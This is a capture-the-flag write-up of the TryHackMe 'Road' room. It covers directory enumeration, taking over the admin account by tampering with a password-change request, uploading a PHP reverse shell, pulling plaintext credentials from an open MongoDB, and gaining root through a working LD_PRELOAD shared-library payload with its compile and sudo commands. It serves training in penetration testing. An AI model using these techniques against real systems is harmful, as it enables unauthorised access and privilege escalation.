# 92 - Road (email hijacking, MongoDB, LD\_PRELOAD exploitation)

Room Link --> [https://tryhackme.com/room/road](https://tryhackme.com/room/road)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
SSH port 22
Port 80 HTTP
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" %}
```bash
gobuster dir -e -u http://road.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt  -xjs,txt,php

index.html
phpMyAdmin
v2
```
{% endcode %}

{% code overflow="wrap" %}
```bash
gobuster dir -e -u http://road.thm/v2/ -t30 -w /usr/share/dirb/wordlists/common.txt  -xjs,txt,php

/v2/admin
/v2/index.php
/v2/lostpassword.php
/v2/profile.php
```
{% endcode %}

We have to register an account.

### Initial Access

The profile section displays the user profile and also an admin email which is probably the admin's username.&#x20;

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We can think about hijacking the email, we have a section to change the password of the registered user having the previous password, we can try to enter my username and credentials and capture the request using Burp Suite and change my username to admin email.

This way we can change the password of the Administrator user and we will have access to the file upload part.

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Intercept with burpsuite and change the username to admin username.

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Login in as admin:

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Now we can upload a php reverse shell on the server.

After uploading, looking for where it was uploaded to, inspecting the source code and searching for `/v2` we see a dir, i checked it out but:

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Navigating to --> [http://road.thm/v2/profileimages/rev.php](http://road.thm/v2/profileimages/rev.php)

And the rev shell was triggered.

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to webdeveloper

We enumerate the box using `ss -tl` .

```bash
www-data@sky:/home/webdeveloper$ ss -tl
State   Recv-Q  Send-Q     Local Address:Port       Peer Address:Port  Process  
LISTEN  0       4096           127.0.0.1:27017           0.0.0.0:*              
LISTEN  0       151            127.0.0.1:mysql           0.0.0.0:*              
LISTEN  0       4096       127.0.0.53%lo:domain          0.0.0.0:*              
LISTEN  0       128              0.0.0.0:ssh             0.0.0.0:*              
LISTEN  0       70             127.0.0.1:33060           0.0.0.0:*              
LISTEN  0       511            127.0.0.1:9000            0.0.0.0:*              
LISTEN  0       511                    *:http                  *:*              
LISTEN  0       128                 [::]:ssh                [::]:*       
```

MongoDB is running on 27017

Search google for MongoDB exploit, and found the [hacktricks blog](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)

```bash
www-data@sky:/home/webdeveloper$ mongo 127.0.0.1:27017
```

And we are in the DB interface.

```
> show dbs;
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use admin
switched to db admin
> show collections
system.version
> use backup
switched to db backup
> show collections
collection
user
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
> 
```

We got credentials for "webdev..."

`webdeveloper : BahamasChapp123!@#`&#x20;

So we ssh into the account.

### Priv Esc to root

`sudo -l`&#x20;

```bash
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

#### LD\_PRELOAD exploitation

`env_keep+=LD_PRELOAD`. I searched for what LD\_PRELOAD is. It allowed passing shared libraries that would be loaded when the program start.

I found a [great post on using LD\_PRELOAD to escalate privileges](https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/). I used the provided code to get root

We will create a shell in C:

{% code title="shell.c" %}
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
{% endcode %}

Now compile it with gcc

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

```bash
webdeveloper@sky:~$ cd /tmp
webdeveloper@sky:/tmp$ vim shell.c
webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 |  setgid(0);
      |  ^~~~~~
shell.c:7:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |  setuid(0);
      |  ^~~~~~
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# whoami
root
```

Done



